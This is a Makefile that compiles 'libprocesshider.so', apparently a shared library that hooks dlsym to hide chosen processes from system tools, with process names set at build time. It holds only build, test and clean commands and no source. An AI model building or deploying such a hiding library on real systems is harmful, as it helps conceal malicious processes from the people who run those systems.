all: clean test libprocesshider.so

test: libprocesshider.so
	./testlib.sh

libprocesshider.so: processhider.c
	echo $(NAMES)
	echo $(INDEXS)

	gcc -D 'NAMES=$(NAMES)' -D 'INDEXS=$(INDEXS)' -Wall -fPIC  -shared -o libprocesshider.so config.h processhider.c hide_dlsym.c  -ldl

.PHONY clean :
	rm -f libprocesshider.so
